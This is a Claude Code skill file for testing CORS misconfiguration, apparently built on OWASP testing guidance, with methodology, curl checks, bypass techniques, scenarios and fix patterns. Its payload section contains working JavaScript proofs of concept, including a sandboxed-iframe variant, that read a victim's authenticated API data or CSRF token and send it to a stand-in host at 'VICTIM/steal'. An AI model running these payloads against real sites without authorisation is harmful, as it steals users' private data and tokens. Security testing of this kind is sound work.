---
name: cors-misconfig
description: >
  CORS misconfiguration allows attacker-controlled origins to read sensitive cross-origin responses when servers echo the `Origin` header in `Access-Control-Allow-Origin` or set it to `*` with `Access-Control-Allow-Credentials: true`. Detect via `Origin: https://attacker.com` reflection in `Access-Control-Allow-Origin` response header, wildcard `*` on credentialed endpoints, and null origin acceptance. Tools: OWASP ZAP, Burp Suite, manual `fetch()` with `credentials: include`.
license: MIT
compatibility: Designed for Claude Code. Requires Burp Suite or OWASP ZAP, attacker-controlled HTTPS server for PoC.
metadata:
  category: client-side
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-CLNT-07
---

# CORS Misconfiguration

## What Is Broken and Why
Cross-Origin Resource Sharing (CORS) extends the same-origin policy to allow controlled cross-origin requests. Misconfigurations arise when servers reflect arbitrary `Origin` values in `Access-Control-Allow-Origin` without validation, allow `null` origins (exploitable via sandboxed iframes), or combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (which browsers reject per spec but server-side logic may still honor insecurely). An attacker exploiting a CORS misconfiguration can read authenticated API responses from a victim's browser, leaking session data, PII, CSRF tokens, and other sensitive information.

## Key Signals
- `Access-Control-Allow-Origin` mirrors the `Origin` request header verbatim
- `Access-Control-Allow-Origin: *` on endpoints returning sensitive data (even without credentials, if the data is public-sensitive)
- `Access-Control-Allow-Credentials: true` combined with origin reflection
- `Access-Control-Allow-Origin: null` — exploitable via sandboxed iframe
- Wildcard subdomain trust: any `*.example.com` origin accepted, including attacker-controlled subdomains
- Missing `Vary: Origin` header indicating improper caching of CORS responses

## Methodology
1. Identify API endpoints and sensitive data responses.
2. Add `Origin: https://attacker-controlled.com` to requests; check if it is reflected in `Access-Control-Allow-Origin`.
3. Add `Origin: null`; check if `Access-Control-Allow-Origin: null` is returned.
4. Check `Access-Control-Allow-Credentials: true` — if combined with origin reflection, full exploitation is possible.
5. Test subdomain variations: `Origin: https://evil.TARGET-DOMAIN` to check for overly broad subdomain trust.
6. Test with OWASP ZAP's passive and active scanner for automated CORS header analysis.
7. Build a PoC with `fetch()` and `credentials: include` from an attacker page to confirm read access.

## Payloads & Tools
```
# Manual header injection test
curl -s -H "Origin: https://attacker.com" \
     -H "Cookie: session=TOKEN" \
     -v TARGET/api/user-data 2>&1 | grep -i "access-control"

# Check for null origin acceptance
curl -s -H "Origin: null" TARGET/api/sensitive-data -v 2>&1 | grep -i "access-control"

# Check for subdomain trust
curl -s -H "Origin: https://evil.target-domain.com" TARGET/api/data -v 2>&1 | grep access-control

# JavaScript PoC — origin reflection with credentials
<script>
fetch('https://TARGET/api/account', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  fetch('https://VICTIM/steal?d=' + encodeURIComponent(data));
});
</script>

# JavaScript PoC — null origin via sandboxed iframe
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
fetch('https://TARGET/api/account', {credentials: 'include'})
.then(r => r.text())
.then(d => top.location = 'https://VICTIM/steal?d=' + encodeURIComponent(d));
</script>"></iframe>

# CORS misconfiguration leading to CSRF token read
<script>
fetch('https://TARGET/account/settings', {credentials: 'include'})
.then(r => r.text())
.then(html => {
  var csrfToken = html.match(/csrf[_-]?token.*?value="([^"]+)"/i)[1];
  // Now use csrfToken to submit CSRF-protected forms
  fetch('https://VICTIM/steal?t=' + csrfToken);
});
</script>

# ZAP — Active scan for CORS
# Analyze -> Active Scan -> run against target; check Alerts for CORS issues
```

## Bypass Techniques
- `null` origin via sandboxed iframes or `data:` URI documents (bypasses many origin allowlists)
- Subdomain exploitation: if `*.target.com` is trusted and any subdomain is takeover-able, that subdomain can read responses
- HTTP/HTTPS mixing: `Origin: http://target.com` may be accepted by `https://target.com`
- Prefix/suffix matching bugs: server checking `endsWith('.target.com')` trusts `attacker.target.com.evil.com`
- Protocol confusion: some servers normalize origins before comparison

## Exploitation Scenarios
**Scenario 1 — Account Data Exfiltration**
Setup: `/api/user-profile` returns full user PII; server reflects any `Origin` with `Access-Control-Allow-Credentials: true`.
Trigger: Attacker hosts page with `fetch('TARGET/api/user-profile', {credentials: 'include'})` → exfiltrates response.
Impact: Victim's name, email, phone number, and account details sent to attacker on page visit.

**Scenario 2 — CSRF Token Theft Enabling CSRF**
Setup: CSRF-protected form's token is embedded in a JSON API response on an endpoint with CORS origin reflection.
Trigger: Attacker reads `/api/form-data` cross-origin, extracts CSRF token, then submits forged state-change request with valid token.
Impact: CSRF protection bypassed entirely; attacker performs arbitrary authenticated actions.

**Scenario 3 — Internal API Access via Null Origin**
Setup: Internal API at `/internal/admin-data` accepts `Origin: null` due to developer testing configuration left in production.
Trigger: Attacker uses sandboxed iframe to send request with `Origin: null` and `credentials: include`.
Impact: Internal admin data returned to attacker-controlled page.

## False Positives
- `Access-Control-Allow-Origin: *` on public API endpoints with no sensitive data and no credential support
- CORS headers present but `Access-Control-Allow-Credentials` absent (cookies not sent, data may be non-sensitive)
- Origin reflection with allowlist validation happening before header is set (check server-side code, not just headers)
- Pre-flight OPTIONS responses showing permissive headers that are more restrictive on actual GET/POST

## Fix Patterns
- Maintain an explicit server-side allowlist of permitted origins; never reflect the `Origin` header verbatim
- Never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
- Return `Access-Control-Allow-Origin: null` only intentionally (avoid in production)
- Add `Vary: Origin` header when the response differs by origin (prevents cache poisoning)
- For APIs: use `Content-Type: application/json` requirement and validate all CORS origins per request
- Audit subdomain CORS trust — each trusted subdomain is an expansion of the attack surface

## Related Skills

[[csrf]] and CORS misconfiguration are tightly coupled: a CORS origin-reflection bug lets an attacker read CSRF tokens cross-origin, turning a CSRF-protected form into an exploitable target. When [[ssrf]] and CORS coexist, the server's trusted position in the internal network can be leveraged similarly — both attacks abuse trust boundaries. A [[dom-xss]] on a CORS-trusted origin can exfiltrate data from the victim's authenticated API responses. Subdomain CORS trust also expands the scope of [[cookie-attacks]] because subdomain XSS can set or read parent-domain cookies.
